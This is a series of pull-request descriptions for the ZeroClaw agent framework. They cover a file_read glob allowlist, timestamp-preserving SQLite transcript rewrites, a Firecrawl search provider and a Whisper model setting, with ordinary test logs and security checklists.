prs.title: feat(security): add glob patterns for file_read path filtering
prs.body:
## Summary

- **Base branch:** `master`
- **What changed and why:** `file_read` admits any path that passes the directory-level `is_resolved_path_readable` check (workspace + read-write/read-only allowlists). There is no way to narrow reads by path *shape*, so a tool legitimately reading one file inside a skill bundle can also read every other file in the same root. This adds an optional glob allowlist as a second, ANDed stage.
- **What changed and why (mechanics):** Add `file_read_allowed_patterns: Vec<String>` to `SecurityPolicy` and `RiskProfileConfig`, plus `SecurityPolicy::is_file_read_pattern_allowed`. `FileReadTool` now calls it after `is_resolved_path_readable` and returns `success: false` (without consuming a rate-limit budget slot) when no pattern matches.
- **Scope boundary:** Pure additive restriction. Empty list is the default and reproduces today's behavior exactly; the new check only fires when patterns are configured. No change to `is_resolved_path_readable`, sandbox, or write-path authorization.
- **Blast radius:** `file_read` tool reads only. No permission, routing, or I/O boundary changes outside that tool.
- **Linked issue(s):** None.

### What this does, simply

Operators can now write `file_read_allowed_patterns = ["**/SKILL.md", "**/references/*.md"]` on a risk profile to let an agent read only skill manifests and reference docs, even though its workspace root contains other files. Matching is case-sensitive against the canonicalized absolute path; `*` and `?` never cross `/` (so `**/references/*.md` matches direct children but not `references/sub/inner.md` — spell deeper nesting `**/*.md`); an invalid pattern fails closed rather than widening access. An empty list keeps the previous behavior.

## Design notes (policy contract)

**Why a separate read-only allowlist.** The directory-level gates (`is_resolved_path_readable` for reads, `is_resolved_path_allowed` for writes) authorize *which roots* are readable, not *which files inside a root*. A skill bundle that legitimately needs `SKILL.md` and `references/*.md` otherwise gains read access to every file under its workspace root. `file_read_allowed_patterns` adds a second, ANDed stage that narrows reads by path shape. It is deliberately read-only and scoped to `file_read`; it is not a general-purpose path policy and does not change write authorization.

**Composition with existing policy.** `FileReadTool` runs `is_resolved_path_readable` first, then `is_file_read_pattern_allowed` on the same already-canonicalized path. The two stages AND: a read must be inside an admitted root *and* match a pattern. `forbidden_paths` and write-only roots are unaffected. The universal POSIX device exemption (`/dev/null`, etc.) lives in the directory-level check and does **not** carry into the glob layer — once patterns are set, device paths also need an explicit pattern.

**Workspace files vs external allowed roots.** The glob filter runs after the directory-level check, so it applies uniformly to the agent's own workspace and to cross-agent read-only roots granted via `workspace.access`. There is no implicit bypass by path origin: with patterns set, both own-workspace and granted-subtree reads must match; with an empty list, both are admitted by the directory-level gate as before.

**Why absolute-path matching.** `FileReadTool` canonicalizes (`tokio::fs::canonicalize`) before the existing directory-level check, resolving symlinks. Matching against that canonicalized absolute path keeps the glob layer consistent with the `resolved` value the authorization check already compared and avoids symlink aliasing (two spellings collapse to one path). Patterns are therefore written against canonical absolute paths.

**Child-agent inheritance.** The field lives on `RiskProfileConfig` and is resolved per agent. How a child is spawned decides which policy it reads: an ordinary `spawn_subagent` uses the parent's policy (so it inherits the same `file_read_allowed_patterns`), and a bounded delegate reuses the parent's prebuilt file-read tool (so it inherits the restriction implicitly). Only an explicitly independent delegate resolves the target agent's own profile; an empty list on that profile then disables filtering for that delegate. So the empty-list rule is a per-profile default, not a statement that children always lose the parent's restriction.

**Scope.** The filter governs only `file_read`. Other read-capable tools (`shell`, `skill_tool`, etc.) are outside it and remain governed by their own policy checks. Treat `file_read_allowed_patterns` as a targeted narrowing of `file_read`, not a workspace-wide read policy.

## Testing (required)

### How you can test (when useful)

- **Reviewer testing requested?** `N/A`; pure config + path-matching logic exercised by unit tests and required CI.

### How I tested

- **CI checks relied on and why they cover this change:** Required hosted CI covers the changed `zeroclaw-config` / `zeroclaw-runtime` surfaces via `Test`, `Lint`, `Format`, and `Parallel Runtime Test`.
- **Known CI coverage gap, if any:** None beyond the added unit tests; the matcher is a pure function of the path and pattern list.

- **Commands run and tail output:**

```text
$ cargo fmt --all -- --check
(no output; formatting clean)

$ cargo clippy -p zeroclaw-config -p zeroclaw-runtime --all-targets -- -D warnings
    Finished `dev` profile [unoptimized + debuginfo] target(s) in 5m 20s
(no warnings)

$ cargo test --locked -p zeroclaw-config --lib
test result: ok. 1770 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out

$ cargo test --locked -p zeroclaw-config --lib is_file_read_pattern_allowed
test result: ok. 8 passed; 0 failed; 0 ignored; 0 measured; 1762 filtered out

$ cargo test --locked -p zeroclaw-runtime --lib file_read
test result: ok. 37 passed; 0 failed; 0 ignored; 0 measured; 5413 filtered out

$ git diff --check
(no output)
```

- **Beyond CI, what did you manually verify?** Exercised the matcher semantics by hand: empty list admits everything; `**/references/*.md` rejects `references/sub/inner.md` but admits `references/ceshi.md`; `**/references/**/*.md` admits the nested file; an unclosed `[` pattern fails closed; `/dev/null` needs an explicit pattern to be admitted once any patterns are set.
- **Visual interface changed?** `N/A`; config-only.

## Security & Privacy Impact (required)

- New permissions, capabilities, or file system access scope? No — this *narrows* `file_read` access when configured; default is unchanged.
- New external network calls? No
- Secrets / tokens / credentials handling changed? No
- PII, real identities, or personal data in diff, tests, fixtures, or docs? No
- Prompt injection or untrusted model-visible text introduced/changed? No

## Compatibility (required)

- Backward compatible? Yes (empty list = no filtering, exactly today's behavior)
- Config / env / CLI surface changed? Yes — one new optional `file_read_allowed_patterns` field on `RiskProfileConfig` (default empty)
- Rust/MSRV/toolchain floor changed? No (`glob = "0.3"` is already in the dependency graph)

## Rollback (required for medium/high-risk PRs)

Rollback plan: `git revert <sha>`.

## Summary

- **Base branch:** `master`
- **What changed and why:**

prs.title: fix(infra): preserve created_at of retained rows when replacing a session transcript
prs.body:
## Summary

- **Base branch:** `master` (all contributions)
- **What changed and why:**
  - Replacing a SQLite session transcript deleted every row and reinserted them all with one timestamp, so from the second turn on `GET /api/sessions/{id}/messages` returned the time of the last write for every message. The replacement now aligns the new transcript with the stored rows and lets every row that lines up keep its `created_at`; only genuinely new messages get the time of the write.
  - The alignment is the longest run of stored rows that equals the start of the new transcript (earliest run on a tie, which drops the fewest rows). That covers an appended turn, a trim from the start, a trim plus a new turn, and any of these with a changed last row. The usual per-turn case inserts only the new tail and deletes nothing.
  - The history-trim breadcrumb is identified by the stored and incoming flags, never by its text. A newly inserted breadcrumb takes the time of its first write; a retained one keeps its own. The bare `rewrite_messages` leaves the stored flag untouched and says so by passing no incoming flag (`Option<bool>`), so it cannot disagree with the stored one.
  - The three replacement paths now open their transaction as `IMMEDIATE`, because they read before they write. `last_activity` stays the time of the write, never an inherited message time.
  - Tests cover both SQLite replacement paths, the gateway restore-time trim, the gateway end-of-turn write (with and without a history cap) and the RPC chat restore-time trim. A criterion benchmark covers the write paths.
- **Scope boundary:**
  - No backfill: rows that were already flattened are inherited as they are; no historical times are invented.
  - Not changed: the JSONL backend (it stores no per-row times), the ACP store (`acp_messages.created_at` has the same flattening mechanism but a different writer; tracked in #11675), and how channel hydration decides the breadcrumb flag from the text of the first row (a different mechanism, outside this change; it will be reported separately if its analysis confirms it). The API shape, the schema and the configuration are unchanged.
  - Known limits, each pinned by a test: when identical messages cannot be told apart after a trim, the write drops the fewest old rows, so a retained row may inherit the time of an earlier identical one (this is the behavior agreed in the issue thread); and an incoming breadcrumb flag with no breadcrumb row makes the first row inherit the time of the stored first row.
- **Blast radius:** every consumer of SQLite session transcripts: gateway WebSocket chat, RPC chat and channel sessions, and whatever shows the times returned by `GET /api/sessions/{id}/messages` (the dashboard Sessions view; #11622 reads them in ZeroCode). Channel sessions reach the changed code through `replace_conversation_state` (`crates/zeroclaw-channels/src/orchestrator/mod.rs`). Every replacement now reads the stored rows before writing; see the measurements below.
- **Linked issue(s):** Fixes #11420. Related #11593 (an earlier attempt by the same author, closed without merging). Related #11622. Related #11675 (the same mechanism in the ACP store).

### What this does, simply

ZeroClaw keeps each chat session as a list of messages in SQLite, and every message row has a `created_at`: the time it was first saved. At the end of every turn the agent hands the backend its whole current history, and the backend used to delete all the rows of the session and write them again with the time of that moment. Messages from earlier turns therefore all showed the time of the latest turn, and the original times were lost for good.

This change makes the backend compare the new history with what is stored. Messages that are still there keep the time they were first saved, and only messages that are really new get the current time. When the agent trims old turns, the turns it keeps keep their times too. When a turn only adds messages, nothing is deleted. Sessions that were already flattened are not repaired, because the original times no longer exist anywhere.

## Testing (required)

### How you can test (when useful)

- **Reviewer testing requested?** Yes
- **Interface(s) exercised:** `web` (gateway WebSocket chat and `GET /api/sessions/{id}/messages`) and `tui` (RPC chat, `session/new` restoring a session). No channel surface is exercised by an end-to-end test.
- **Setup / preconditions:** a Rust toolchain and a Linux or WSL checkout. Building the `zeroclaw-runtime` tests is memory-heavy: on a 6 GB machine I used `CARGO_PROFILE_DEV_DEBUG=0 CARGO_PROFILE_TEST_DEBUG=0 CARGO_BUILD_JOBS=1`.
- **Steps to run:**
  1. On this branch:
     ```sh
     cargo test -p zeroclaw-infra --locked --lib session_sqlite
     cargo test -p zeroclaw-gateway --locked --lib websocket_turn_end
     cargo test -p zeroclaw-gateway --locked --lib websocket_restore_time_trim_keeps_created_at_of_retained_sqlite_rows
     cargo test -p zeroclaw-runtime --locked --lib session_new_restore_time_trim_keeps_created_at_of_retained_chat_rows
     ```
  2. For the old behavior, put only the two backend source files back to `master` and rerun the gateway and runtime commands (the backend tests live inside `session_sqlite.rs`, so they disappear with it):
     ```sh
     git checkout origin/master -- crates/zeroclaw-infra/src/session_sqlite.rs crates/zeroclaw-infra/src/session_backend.rs
     ```
     Restore with `git checkout HEAD -- crates/zeroclaw-infra/src/session_sqlite.rs crates/zeroclaw-infra/src/session_backend.rs`.
- **Expected on this branch (after):** all four commands pass.
- **Prior behavior on `master` (before):** the four integration tests fail, each on a time comparison:
  - `websocket_turn_end_keeps_created_at_of_earlier_turns_in_sqlite`: `row 0 of the first turn must keep the time it was first persisted`
  - `websocket_turn_end_trim_keeps_created_at_of_retained_sqlite_rows`: `turn 2: "[CURRENT DATE & TIME: …]\n\nprompt number 1" must keep the time it was first persisted`
  - `session_new_restore_time_trim_keeps_created_at_of_retained_chat_rows`: `retained row "turn two request" must keep the time it was first persisted`
  - `websocket_restore_time_trim_keeps_created_at_of_retained_sqlite_rows`: `retained row "turn two request" must keep its original time`

### How I tested

- **CI checks relied on and why they cover this change:** `Format` (rustfmt), `Lint` (`clippy --all-targets` compiles the new benchmark; the comment hygiene gate covers the new comments) and `Test` (runs the new unit and integration tests on the changed crates).
- **Known CI coverage gap, if any:** the benchmark is compiled by the lint job but never run in CI, and the performance numbers below are from one machine. The `bench` job only compiles `agent_benchmarks`.
- **Commands run and tail output:** Linux (WSL2, rustc 1.98.1), on the final commit unless noted.

  ```text
  cargo test -p zeroclaw-infra --locked
  test result: ok. 334 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out
  test result: ok. 1 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out

  cargo test -p zeroclaw-gateway --locked --lib
  test result: ok. 651 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out

  cargo test -p zeroclaw-runtime --locked --lib session_new_restore_time_trim_keeps_created_at
  test rpc::dispatch::tests::session_new_restore_time_trim_keeps_created_at_of_retained_chat_rows ... ok
  test result: ok. 1 passed; 0 failed; 0 ignored; 0 measured; 5699 filtered out

  cargo clippy -p zeroclaw-infra -p zeroclaw-gateway -p zeroclaw-runtime --locked --all-targets -- -D warnings -A clippy::drop-non-drop
  Finished `dev` profile [unoptimized] target(s)

  python scripts/ci/comment_hygiene_gate.py <changed files>
  Comment hygiene gate passed.
  ```

  `rustfmt --edition 2024 --check` on each changed `.rs` file passes (I did not run `cargo fmt --all` because the workspace does not resolve on my Windows host). The runtime test above was run on an earlier commit of this branch whose `dispatch.rs` is identical to the final one.
- **Beyond CI, what did you manually verify?**
  - Regression checks: with the two backend source files from `master`, the four integration tests above fail with the messages listed; with the branch they pass. For the backend, the two original reproduction tests from the issue (`rewrite_keeps_created_at_of_unchanged_rows` and `rewrite_if_exists_keeps_created_at_of_unchanged_rows`) fail on `master` at `ea4a54bb5` and pass on the branch.
  - `t19_replacements_do_not_fail_with_database_is_locked_under_contention` passes 12 of 12 runs and fails 11 of 12 when the `IMMEDIATE` transaction is changed to a deferred one, so it does catch that change (it is a race, not deterministic).
  - Alignment: a standalone copy of the pure alignment functions was checked against an independent oracle on 60,000 random transcripts (append, trim, trim plus append, changed last row, changed last row plus trim, with and without a breadcrumb) with 0 mismatches, and the fast "insert only the tail" path never fired when stored rows differed from the requested ones.
  - Performance, one machine (WSL2), `opt-level = 3` and no LTO through `CARGO_PROFILE_BENCH_*` (the repo's release profile optimizes for size), binaries for `master` and the branch run alternately in rounds with the order rotated, paired by round. Median time per call at 1000 messages:

    | case | messages of ~230 B, `master` → branch | messages of ~20 KB, `master` → branch |
    | --- | --- | --- |
    | rewrite, unchanged transcript | 37.5 ms → 0.40 ms | 245 ms → 13.5 ms |
    | rewrite plus one new turn | 32.7 ms → 0.82 ms | 268 ms → 25.2 ms |

    Both improvements were in the right direction in every one of 7 rounds. `append` (unchanged code) and `load_with_timestamps` showed no consistent difference.
  - **Cost:** with messages of ~20 KB, rewrites that drop most of the transcript are slower, because the stored rows are now read before they are replaced. Compaction at 1000 messages went from 83.5 ms to 93.2 ms (median of 11 rounds; the branch was slower in 10 of them, sign test p = 0.012, which does not survive a correction for the five cells I compared). A half trim went from 161 ms to 197 ms (median of 7 rounds; slower in 6 of them, p = 0.125, inconclusive). Peak memory of the unchanged rewrite with a ~20 MB transcript rose from about 39 MB to about 51 MB. Round-to-round variation of the same binary was 1.5x to 2x, so small differences should not be read as findings.
- **Visual interface evidence:** `N/A` (no presentation change; the values of an existing field change)
- **Tested revision, interface, and evidence path:** N/A (see above)
- **Screenshot or exact-output evidence:** N/A
- **Action or changed state and observed result:** N/A
- **If any command was intentionally skipped, why:** I did not run the full workspace tests, the full `zeroclaw-runtime` lib suite, the `zeroclaw-channels` tests, or anything on Windows or macOS; I did not run a real provider, the dashboard or a browser against this branch. The gateway tests use a real gateway and the SQLite backend with a local provider fixture. `clippy` is run with `-A clippy::drop-non-drop` on the three changed crates because that lint fails today on unchanged code in `zeroclaw-channels` (`crates/zeroclaw-channels/src/orchestrator/mod.rs`, three `drop(dispatch_ownership)` calls), which is identical on `master`.

## Security & Privacy Impact (required)

- New permissions, capabilities, or file system access scope? `No`
- New external network calls? `No`
- Secrets / tokens / credentials handling changed? `No`
- PII, real identities, or personal data in diff, tests, fixtures, or docs? `No`
- Prompt injection or untrusted model-visible text introduced/changed? `No`
- If any `Yes`, describe the risk and mitigation: none. For the record: `created_at` was already returned by `GET /api/sessions/{id}/messages`; this change only makes it return the time each message was first saved instead of the time of the last write. The new SQL statements use bound parameters, and the transcript and breadcrumb flag are still written in one transaction, with the deleted-session guard of `replace_conversation_state_if_exists` unchanged (it still returns `false` and writes nothing).

## Compatibility (required)

- Backward compatible? `Yes` (no schema change; existing databases work as they are; rows already flattened stay flattened)
- Config / env / CLI surface changed? `No`
- Rust/MSRV/toolchain floor changed? `No`
- If backward compatibility is `No` or either surface/floor question is `Yes`: exact upgrade steps for existing users: not applicable. The benchmark adds `criterion = "0.8"` as a dev-dependency of `zeroclaw-infra`; `criterion` is already in the workspace, and `Cargo.lock` gains only that one dependency line.

## Rollback (required for medium/high-risk PRs)

- **Fast rollback command/path:** `git revert` the two commits of this PR. There is no data migration: the stored columns are the same, times written by the new behavior stay valid, and the old code would flatten them again at its next replacement.
- **Feature flags or config toggles:** `None`
- **Observable failure symptoms:** the gateway log message `Failed to persist authoritative post-turn conversation state` or `database is locked` errors from session persistence; a retained message showing the time of the latest turn again; slower end-of-turn writes in very long sessions with large messages.

prs.title: feat(tools): add Firecrawl web search provider
prs.body:
Hey, I'm Juampi from the Firecrawl team.

## Summary

- **Base branch:** `master`
- **What changed and why:**
  - Adds Firecrawl as a `web_search_tool` provider (`search_provider = "firecrawl"`, aliases `firecrawl-search` / `firecrawl_search`). It calls `POST https://api.firecrawl.dev/v2/search` with the key as a Bearer token and asks for web results only (`sources: ["web"]`), so each result is a title, URL and short description like the other providers. Full pages stay with `web_fetch`.
  - The key is a new optional secret, `[web_search] firecrawl_api_key` (`#[secret]` / `encrypted_secret`, same as the other keyed providers). It is resolved and decrypted from `config.toml` on every call, so adding, rotating or removing it needs no restart. When the loader applies `ZEROCLAW_web_search__firecrawl_api_key`, the runtime factory passes that effective value to the tool; a blank override means "not configured" and never falls back to the stored key.
  - Responses go through the shared helpers: non-2xx statuses use `http_search_failure` (so a 429 is `search_status=unavailable`), the body is read through the bounded reader (1 MiB), a `success: false` answer on a 2xx is a failure, a missing `data.web` means no results, and titles, URLs and descriptions are whitespace-collapsed, results without a URL are skipped, and titles and descriptions go through `cap_result_content`. The query is cut to the 500 characters the API accepts, and redirects are disabled on the Firecrawl client.
  - The default provider is unchanged (`duckduckgo`).
- **Scope boundary:** No changes to the other providers, the default provider, `web_fetch` (including its existing Firecrawl fallback), plugins, or approvals. New user-facing errors use Fluent keys in both en tool catalogs. No new dependency or feature flag. The key resolver follows the existing per-provider resolvers instead of refactoring them into a shared helper, to keep this PR to one concern; happy to do that as a follow-up if you want it.
- **Blast radius:** `zeroclaw-tools` (routing and tool), `zeroclaw-config` (one new optional secret field, defaults to `None`, existing configs parse unchanged), `zeroclaw-runtime` (passes the effective env override into the tool), and the tools overview page.
- **Linked issue(s):** None.

### What this does, simply

`web_search_tool` can already use several search backends, chosen with `[web_search] search_provider`. This adds Firecrawl to that list. Someone who sets `search_provider = "firecrawl"` and a `firecrawl_api_key` gets web results from Firecrawl instead of the default DuckDuckGo scrape. Nothing changes for anyone who does not opt in.

## Testing (required)

### How you can test (when useful)

- **Reviewer testing requested?** Yes. It needs a Firecrawl API key, created at <https://www.firecrawl.dev/app/api-keys>.
- **Interface(s) exercised:** `cli` (any surface that runs `web_search_tool`).
- **Setup / preconditions:** `[web_search] search_provider = "firecrawl"` and `firecrawl_api_key = "..."` in `config.toml`, or `ZEROCLAW_web_search__firecrawl_api_key` in the environment.
- **Steps to run:** ask the agent to search the web for anything, or call `web_search_tool` with `{"query": "what is the rust programming language"}`.
- **Expected on this branch (after):** `Search results for: what is the rust programming language (via Firecrawl)` followed by numbered results, each with a URL and a description of at most about 500 characters.
- **Prior behavior on `master` (before):** `search_provider = "firecrawl"` is unknown, logs `Unknown web search model_provider 'firecrawl'; falling back to 'duckduckgo'`, and scrapes DuckDuckGo.

### How I tested

- **CI checks relied on and why they cover this change:** the Test job runs the `zeroclaw-tools`, `zeroclaw-config` and `zeroclaw-runtime` suites, which hold every new test (aliases, key resolution and rotation, env override, secret-safe parse errors, request shape on a mock server, bounded body reads, redirect rejection, 429 handling, render caps). Docs Style covers the changed Markdown.
- **Known CI coverage gap, if any:** the live endpoint is not exercised in CI, same as the other providers; request shape is pinned by wiremock tests.
- **Commands run and tail output** (rustc 1.99.0, at `27fdddf`):

```text
cargo fmt --all -- --check                                                         clean
cargo deny check                                     advisories ok, bans ok, licenses ok, sources ok
cargo test --locked -p zeroclaw-tools --features tools-external --lib web_search   183 passed; 0 failed
cargo test --locked -p zeroclaw-config --lib                                       1818 passed; 0 failed
cargo test --locked -p zeroclaw-runtime --features tools-external --lib api_key_override   1 passed
```

- **Beyond CI, what did you manually verify?** A real search through `WebSearchTool::execute` against `api.firecrawl.dev` with the key supplied as `ZEROCLAW_web_search__firecrawl_api_key`: 5 results in about 0.8 s, output labelled `(via Firecrawl)`, every result a title, URL and usually a description, and the key does not appear anywhere in the output. Descriptions can come back as long multi-line excerpts (one was over 10,000 characters before the cap), which is why the text is whitespace-collapsed and capped. Not verified live: a real 429 (covered by a wiremock test).
- **Visual interface evidence:** `Exact plain-text output`. The only user-visible change is the `web_search_tool` plain-text result block, which is deterministic and unstyled.
- **Tested revision, interface, and evidence path:** `27fdddf`, `cli` (`web_search_tool` output as returned to the model). Locale and terminal width do not shape the output.
- **Screenshot or exact-output evidence:**

```text
Search results for: what is the rust programming language (via Firecrawl)
...
2. Rust Programming Language
   https://www.rust-lang.org/en-US
   Rust's rich type system and ownership model guarantee memory-safety and thread-safety, enabling you to eliminate many classes of bugs at compile-time.
```

- **Action or changed state and observed result:** set `search_provider = "firecrawl"`, called `web_search_tool` with `{"query": "what is the rust programming language"}`, and got the Firecrawl-labelled result block instead of the DuckDuckGo fallback log line.
- **If any command was intentionally skipped, why:** the full workspace `cargo nextest` run was not done locally; the hosted run covers it. Clippy with `-D warnings` and the newer local toolchain stops on an existing deprecation in untouched code (`fetch_update` in web_search_tool.rs), so lint is left to the hosted job.

## Security & Privacy Impact (required)

- New permissions, capabilities, or file system access scope? No (reuses the existing web-search tool surface and config read path).
- New external network calls? Yes. `POST https://api.firecrawl.dev/v2/search`, made only when the operator sets `search_provider = "firecrawl"`, through the same proxy-aware client builder (`apply_runtime_proxy_to_builder`) as the other providers. The request carries the query, the result limit, `sources: ["web"]` and a fixed `origin` value of `zeroclaw` that names the caller.
- Secrets / tokens / credentials handling changed? Yes. One new optional secret field, `[web_search] firecrawl_api_key`, on the existing `#[secret]` / `encrypted_secret` path. The key is sent only as a Bearer header, never in the URL, body or logs. Redirects are disabled, success bodies are limited to 1 MiB before decoding, and malformed-TOML errors expose only a stable code and a derived line number.
- PII, real identities, or personal data in diff, tests, fixtures, or docs? No. Test fixtures use placeholder keys and neutral queries.
- Prompt injection or untrusted model-visible text introduced/changed? Yes. Firecrawl result titles, URLs and descriptions are provider-controlled text returned to the model and must be treated as untrusted. Provider opt-in and the per-result and total output caps limit exposure and volume, but do not sanitize prompt injection.
- If any `Yes`, describe the risk and mitigation: opt-in egress to one provider-scoped host; the key is handled by the established encrypted-secret path; output is bounded.

## Compatibility (required)

- Backward compatible? Yes
- Config / env / CLI surface changed? Yes. New optional `[web_search] firecrawl_api_key` (default `None`), a new accepted value for `search_provider`, and the schema-mirror override `ZEROCLAW_web_search__firecrawl_api_key`. Existing configs parse unchanged.
- Rust/MSRV/toolchain floor changed? No

Revert the squash commit. The provider is opt-in; configs that never set `search_provider = "firecrawl"` are unaffected. If the provider misbehaves, tool errors read `firecrawl search failed (search_status=..., http=...)` in the tool log.

prs.title: feat(config): add optional model to local Whisper transcription
prs.body:
## Summary

- **Base branch:** `master` (all contributions)
- **What changed and why:**
  - `[providers.transcription.local_whisper.<alias>]` and the legacy `[transcription.local_whisper]` block had no way to name a model, so every upload carried only `file`. Strict OpenAI-compatible self-hosted STT servers validate the `model` field and reject the upload (`422 body -> model: Field required`) — and they rarely host a model literally named `"whisper"`, so pointing ZeroClaw at one was impossible even in principle.
  - An operator who guessed `model = "..."` was silently ignored: the key was undeclared, serde dropped it, config load succeeded, and the failure surfaced only as a 4xx at request time — then degraded silently to a raw attachment.
  - `model` is now a typed optional field on both config paths and is sent as a multipart form field **only when configured**. Unset keeps the legacy multipart fields, which whisper.cpp's own server relies on (it selects its model at startup and accepts no selector).
  - Blank/whitespace-only values normalize to "not configured", mirroring the existing `bearer_token` handling.
- **Scope boundary:** the model selector only. No implicit default (we never send `model = "whisper"` when unset), no `initial_prompt`/`prompt` field for local_whisper (separate concern — #11258 explicitly leaves local Whisper alone), no change to the silent-fallback observability when transcription fails, no changes to other STT families, no docs/CLI/TUI changes (the `docs/book` provider pages carry no reference for any `[providers.transcription.*]` keys; the schema doc comments are the documentation).
- **Blast radius:** only local_whisper requests from deployments that set the new key. Every other provider family, and every unset local_whisper deployment, keeps the same request fields. The `schema-export` feature's JSON schema gains one optional non-secret field. Six channel modules and the doctor test constructors get mechanical `model: None` plumbing.
- **Linked issue(s):** Related #11258 (same disease — accepted config never reaching the wire — for the Groq/OpenAI families; its scope note deliberately excluded local_whisper, which this PR completes).

### What this does, simply

ZeroClaw can transcribe voice notes against your own speech-to-text server by pointing the `local_whisper` provider at it. That worked for whisper.cpp's reference server, because whisper.cpp picks its model when it boots and doesn't care what a request asks for. But the OpenAI-compatible `/audio/transcriptions` spec includes a `model` field, and stricter servers — oMLX, for example — insist on it, returning `422 model: Field required` for uploads without one. Worse, ZeroClaw had no config key to name a model, so writing one in TOML did nothing: it was dropped at load time, and the voice note just quietly arrived as a file with no transcript and no hint why.

This adds the missing key. Set `model` to whatever id your server hosts and it rides along on the request; don't set it and ZeroClaw sends exactly what it always sent. This supports compatible local STT servers that require a model selector.

## Testing (required)

### How you can test (when useful)

- **Reviewer testing requested?** `Yes` — the before/after delta is trivially visible against any OpenAI-compatible STT server that validates `model` (e.g. oMLX hosting a Qwen ASR model; any strict server without a model literally named `whisper` will do).
- **Interface(s)** exercised: outbound transcription request body from `LocalWhisperProvider`; no `surface` (web/tui/cli) state changes. Reached from any voice-capable `channel`.
- **Setup / preconditions:** a local STT server that requires `model`; an agent with `transcription_provider` bound to a `local_whisper.<alias>` entry.
- **Steps to run:**
  1. Configure: `[providers.transcription.local_whisper.home]` with `uri = "http://<host>:<port>/v1/audio/transcriptions"` and `model = "<an id the server actually hosts>"`.
  2. Send a voice note on any transcribing channel.
  3. Repeat with the `model` line removed.
- **Expected on this branch (after):** step 2 returns a transcript; step 3 fails server-side (422) and degrades to the attachment — the old behavior.
- **Prior behavior on `master` (before):** step 1 cannot even be expressed — `model` is not a recognized key; every request omits it and a strict server 422s every voice note, silently.

### How I tested

- **CI checks relied on and why they cover this change:** workspace fmt/clippy/ test jobs compile `zeroclaw-config` and `zeroclaw-channels`; the five new lib tests in `transcription.rs` run in the standard channels suite.
- **Known CI coverage gap, if any:** Some touched channel test modules (matrix/lark/line/qq/mattermost) sit behind Cargo feature gates. The commands below do not establish an all-features compile; CI's ci-all covers Matrix.
- **Commands run and tail output:**

```sh
# Rust/code examples; choose the checks that match the changed surface:
cargo fmt --all -- --check
**empty**

# I don't believe this error is caused by my work
cargo clippy --all-targets -- -D warnings

    Checking zeroclaw-providers v0.8.5 (crates/zeroclaw-providers)
error: the borrowed expression implements the required traits
    --> crates/zeroclaw-providers/src/lib.rs:1121:26
     |
1121 |             .is_some_and(&is_word_char);
     |                          ^^^^^^^^^^^^^ help: change this to: `is_word_char`
     |
     = help: for further information visit https://rust-lang.github.io/rust-clippy/rust-1.99.0/index.html#needless_borrows_for_generic_args
     = note: `-D clippy::needless-borrows-for-generic-args` implied by `-D warnings`
     = help: to override `-D warnings` add `#[allow(clippy::needless_borrows_for_generic_args)]`

error: the borrowed expression implements the required traits
    --> crates/zeroclaw-providers/src/lib.rs:1125:26
     |
1125 |             .is_some_and(&is_word_char);
     |                          ^^^^^^^^^^^^^ help: change this to: `is_word_char`
     |
     = help: for further information visit https://rust-lang.github.io/rust-clippy/rust-1.99.0/index.html#needless_borrows_for_generic_args

error: could not compile `zeroclaw-providers` (lib) due to 2 previous errors


cargo test
...
test result: ok. 0 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out; finished in 0.00s

```

- **Beyond CI, what did you manually verify?**
  - The five new tests pin both directions of the wire contract: configured `model` appears as `name="model"` with the exact value; unset `model` must NOT appear at all; blank/whitespace normalize to unset; padded values are trimmed; and `model` survives TOML deserialization into the typed struct end-to-end onto the wire (the exact serde-drop failure mode this PR fixes).
  - Validated with my own local instance, where sending a test voice message elicited this message in response: `Working, working! Your voice note arrived as a proper transcript — "Okay, this is a short voice note. Hello, is this working?" — which is a rather elegant way of answering its own question. 🌀`
  - **Not verified:** transcription quality per model; behavior against servers that *accept* an unexpected `model` field beyond the spec's tolerance; other STT families (unchanged by construction).
- **Visual interface evidence:** `N/A` — no rendered interface state changes; the only observable difference is transcript-vs-attachment chat content covered by the A/B steps above.
- **Tested revision:** branch head `59fc17e17e30771e8fff2c058a29658a8b071b8f` (merged master `6c0b1f9e` 2026-10-12).

## Security & Privacy Impact (required)

- New permissions, capabilities, or file system access scope? `No`
- New external network calls? `No` — the request already existed; this adds one form field to the operator-configured endpoint it already goes to.
- Secrets / tokens / credentials handling changed? `No` — `model` is an identifier, deliberately not a credential class; `bearer_token` keeps its encrypted-secret treatment untouched.
- PII, real identities, or personal data in diff, tests, fixtures, or docs? `No` — fixtures use loopback/mock URLs and public model ids.
- Prompt injection or untrusted model-visible text introduced/changed? `No`
- If any `Yes`, describe the risk and mitigation: n/a

## Compatibility (required)

- Backward compatible? `Yes` — unset `model` preserves the legacy multipart fields; there is a test pinning that.
- Config / env / CLI surface changed? `Yes` — one new optional key `model` on `[providers.transcription.local_whisper.<alias>]` and legacy `[transcription.local_whisper]`.
- Rust/MSRV/toolchain floor changed? `No`
- Upgrade steps: none required. Existing configs are unaffected. To use the feature, add `model = "<server model id>"` to a local_whisper entry.

## Rollback

- **Fast rollback command/path:** `git revert <sha>` — no migration or state to undo; a lingering `model` key in operator config is silently ignored again after revert (serde default), i.e. the pre-PR state.
- **Feature flags or config toggles:** omitting/removing the `model` key restores the legacy wire shape per-entry; `transcription.enabled = false` disables the path entirely.
- **Observable failure symptoms:** misconfigured deployments degrade the old way — voice notes land as raw attachments with no transcript; grep the runtime trace for transcription errors / 422 from the configured local endpoint.

prs.body:
> Maintainer note: I integrated @IftekharUddin's documentation update and corrected the scope and validation account below. The original contributor's work and history are preserved.

## Summary

- **Base branch:** `master` (all contributions)
- **What changed and why:** Documents the shared OpenAI-compatible chat-completions `native_tools` override and its family defaults. Explicit `true` enables native tools and `false` selects text fallback; unset keeps the family default. Custom and Groq chat-completions aliases default to text fallback, Responses keeps native support independently, and Hailo-Ollama rejects `true`. The runtime-profile `tool_dispatcher` comment explains the difference between provider capability and dispatcher selection, and the Custom Providers page includes an opt-in example.
- **Scope boundary:** Documentation only. No code, config parsing, or runtime behavior changes. The reworded comments flow into the generated config reference (`docs/book/src/reference/config.md`, gitignored) and rustdoc on the next generation run; no committed generated artifact changes.
- **Blast radius:** Anyone reading the config schema, the generated config reference, the Custom Providers page, or the Provider Configuration field list. No runtime consumer reads these comments.
- **Linked issue(s):** None.

### What this does, simply

